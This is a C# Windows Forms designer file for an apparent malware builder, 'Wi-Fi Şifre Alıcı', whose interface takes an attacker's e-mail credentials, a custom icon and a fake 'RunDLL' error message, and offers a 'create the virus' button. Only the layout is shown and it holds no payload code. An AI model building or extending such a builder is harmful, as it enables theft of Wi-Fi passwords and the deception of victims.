namespace WifiSifresiGonderici
{
    partial class Form1
    {
        /// <summary>
        ///Gerekli tasarımcı değişkeni.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///Kullanılan tüm kaynakları temizleyin.
        /// </summary>
        ///<param name="disposing">yönetilen kaynaklar dispose edilmeliyse doğru; aksi halde yanlış.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer üretilen kod

        /// <summary>
        /// Tasarımcı desteği için gerekli metot - bu metodun 
        ///içeriğini kod düzenleyici ile değiştirmeyin.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            this.btnIkon = new System.Windows.Forms.Button();
            this.pbIkon = new System.Windows.Forms.PictureBox();
            this.btnOlustur = new System.Windows.Forms.Button();
            this.cbIkon = new System.Windows.Forms.CheckBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.btnMesajTemizle = new System.Windows.Forms.Button();
            this.btnMesajTestEt = new System.Windows.Forms.Button();
            this.txtMesajIcerigi = new System.Windows.Forms.TextBox();
            this.label4 = new System.Windows.Forms.Label();
            this.txtMesajBaslik = new System.Windows.Forms.TextBox();
            this.label3 = new System.Windows.Forms.Label();
            this.btnTestMaili = new System.Windows.Forms.Button();
            this.btnTemizle = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.txtParola = new System.Windows.Forms.TextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.txtPosta = new System.Windows.Forms.TextBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.richKod = new System.Windows.Forms.RichTextBox();
            ((System.ComponentModel.ISupportInitialize)(this.pbIkon)).BeginInit();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.SuspendLayout();
            // 
            // btnIkon
            // 
            this.btnIkon.Location = new System.Drawing.Point(98, 163);
            this.btnIkon.Name = "btnIkon";
            this.btnIkon.Size = new System.Drawing.Size(75, 23);
            this.btnIkon.TabIndex = 0;
            this.btnIkon.Text = "İkon Seç";
            this.btnIkon.UseVisualStyleBackColor = true;
            this.btnIkon.Click += new System.EventHandler(this.btnIkon_Click);
            // 
            // pbIkon
            // 
            this.pbIkon.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.pbIkon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pbIkon.Location = new System.Drawing.Point(8, 102);
            this.pbIkon.Name = "pbIkon";
            this.pbIkon.Size = new System.Drawing.Size(84, 84);
            this.pbIkon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pbIkon.TabIndex = 1;
            this.pbIkon.TabStop = false;
            // 
            // btnOlustur
            // 
            this.btnOlustur.Location = new System.Drawing.Point(319, 127);
            this.btnOlustur.Name = "btnOlustur";
            this.btnOlustur.Size = new System.Drawing.Size(201, 59);
            this.btnOlustur.TabIndex = 2;
            this.btnOlustur.Text = "Virüsü Oluştur";
            this.btnOlustur.UseVisualStyleBackColor = true;
            this.btnOlustur.Click += new System.EventHandler(this.btnOlustur_Click);
            // 
            // cbIkon
            // 
            this.cbIkon.AutoSize = true;
            this.cbIkon.Location = new System.Drawing.Point(98, 102);
            this.cbIkon.Name = "cbIkon";
            this.cbIkon.Size = new System.Drawing.Size(71, 17);
            this.cbIkon.TabIndex = 3;
            this.cbIkon.Text = "İkon Ekle";
            this.cbIkon.UseVisualStyleBackColor = true;
            this.cbIkon.CheckedChanged += new System.EventHandler(this.cbIkon_CheckedChanged);
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.btnMesajTemizle);
            this.groupBox1.Controls.Add(this.btnMesajTestEt);
            this.groupBox1.Controls.Add(this.btnOlustur);
            this.groupBox1.Controls.Add(this.txtMesajIcerigi);
            this.groupBox1.Controls.Add(this.label4);
            this.groupBox1.Controls.Add(this.txtMesajBaslik);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.btnTestMaili);
            this.groupBox1.Controls.Add(this.btnTemizle);
            this.groupBox1.Controls.Add(this.cbIkon);
            this.groupBox1.Controls.Add(this.btnIkon);
            this.groupBox1.Controls.Add(this.label2);
            this.groupBox1.Controls.Add(this.txtParola);
            this.groupBox1.Controls.Add(this.pbIkon);
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.Controls.Add(this.txtPosta);
            this.groupBox1.Location = new System.Drawing.Point(7, 5);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(529, 193);
            this.groupBox1.TabIndex = 5;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Ayarlar";
            this.groupBox1.Enter += new System.EventHandler(this.groupBox1_Enter);
            // 
            // btnMesajTemizle
            // 
            this.btnMesajTemizle.Location = new System.Drawing.Point(319, 99);
            this.btnMesajTemizle.Name = "btnMesajTemizle";
            this.btnMesajTemizle.Size = new System.Drawing.Size(92, 23);
            this.btnMesajTemizle.TabIndex = 16;
            this.btnMesajTemizle.Text = "Temizle";
            this.btnMesajTemizle.UseVisualStyleBackColor = true;
            this.btnMesajTemizle.Click += new System.EventHandler(this.btnMesajTemizle_Click);
            // 
            // btnMesajTestEt
            // 
            this.btnMesajTestEt.Location = new System.Drawing.Point(428, 99);
            this.btnMesajTestEt.Name = "btnMesajTestEt";
            this.btnMesajTestEt.Size = new System.Drawing.Size(92, 23);
            this.btnMesajTestEt.TabIndex = 15;
            this.btnMesajTestEt.Text = "Mesajı Test Et";
            this.btnMesajTestEt.UseVisualStyleBackColor = true;
            this.btnMesajTestEt.Click += new System.EventHandler(this.btnMesajTestEt_Click);
            // 
            // txtMesajIcerigi
            // 
            this.txtMesajIcerigi.Location = new System.Drawing.Point(319, 43);
            this.txtMesajIcerigi.Multiline = true;
            this.txtMesajIcerigi.Name = "txtMesajIcerigi";
            this.txtMesajIcerigi.Size = new System.Drawing.Size(201, 50);
            this.txtMesajIcerigi.TabIndex = 14;
            this.txtMesajIcerigi.Text = "Belirtilen modül bulunamadı.";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Location = new System.Drawing.Point(277, 43);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(41, 13);
            this.label4.TabIndex = 13;
            this.label4.Text = "Mesaj :";
            // 
            // txtMesajBaslik
            // 
            this.txtMesajBaslik.Location = new System.Drawing.Point(319, 13);
            this.txtMesajBaslik.Name = "txtMesajBaslik";
            this.txtMesajBaslik.Size = new System.Drawing.Size(201, 20);
            this.txtMesajBaslik.TabIndex = 12;
            this.txtMesajBaslik.Text = "RunDLL";
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(277, 16);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(41, 13);
            this.label3.TabIndex = 10;
            this.label3.Text = "Başlık :";
            // 
            // btnTestMaili
            // 
            this.btnTestMaili.Location = new System.Drawing.Point(86, 69);
            this.btnTestMaili.Name = "btnTestMaili";
            this.btnTestMaili.Size = new System.Drawing.Size(154, 23);
            this.btnTestMaili.TabIndex = 7;
            this.btnTestMaili.Text = "Test Maili Gönder";
            this.btnTestMaili.UseVisualStyleBackColor = true;
            this.btnTestMaili.Click += new System.EventHandler(this.btnTestMaili_Click);
            // 
            // btnTemizle
            // 
            this.btnTemizle.Location = new System.Drawing.Point(8, 69);
            this.btnTemizle.Name = "btnTemizle";
            this.btnTemizle.Size = new System.Drawing.Size(75, 23);
            this.btnTemizle.TabIndex = 6;
            this.btnTemizle.Text = "Temizle";
            this.btnTemizle.UseVisualStyleBackColor = true;
            this.btnTemizle.Click += new System.EventHandler(this.btnTemizle_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(5, 46);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(43, 13);
            this.label2.TabIndex = 8;
            this.label2.Text = "Parola :";
            // 
            // txtParola
            // 
            this.txtParola.Location = new System.Drawing.Point(88, 43);
            this.txtParola.Name = "txtParola";
            this.txtParola.Size = new System.Drawing.Size(152, 20);
            this.txtParola.TabIndex = 9;
            this.txtParola.TextChanged += new System.EventHandler(this.txtParola_TextChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(5, 20);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(82, 13);
            this.label1.TabIndex = 6;
            this.label1.Text = "E-Posta Adresi :";
            // 
            // txtPosta
            // 
            this.txtPosta.Location = new System.Drawing.Point(88, 17);
            this.txtPosta.Name = "txtPosta";
            this.txtPosta.Size = new System.Drawing.Size(152, 20);
            this.txtPosta.TabIndex = 7;
            this.txtPosta.Text = "@yandex.com";
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.richKod);
            this.groupBox2.Location = new System.Drawing.Point(7, 219);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(529, 13);
            this.groupBox2.TabIndex = 6;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Virüs Kodları";
            // 
            // richKod
            // 
            this.richKod.Location = new System.Drawing.Point(6, 19);
            this.richKod.Name = "richKod";
            this.richKod.Size = new System.Drawing.Size(514, 260);
            this.richKod.TabIndex = 5;
            this.richKod.Text = resources.GetString("richKod.Text");
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
            this.ClientSize = new System.Drawing.Size(543, 204);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.groupBox1);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Wi-Fi Şifre Alıcı v1.0  |  Kodlayan İlkcan Doğan";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pbIkon)).EndInit();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Button btnIkon;
        private System.Windows.Forms.PictureBox pbIkon;
        private System.Windows.Forms.Button btnOlustur;
        private System.Windows.Forms.CheckBox cbIkon;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.Button btnMesajTemizle;
        private System.Windows.Forms.Button btnMesajTestEt;
        private System.Windows.Forms.TextBox txtMesajIcerigi;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox txtMesajBaslik;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Button btnTestMaili;
        private System.Windows.Forms.Button btnTemizle;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.TextBox txtParola;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.TextBox txtPosta;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.RichTextBox richKod;
    }
}

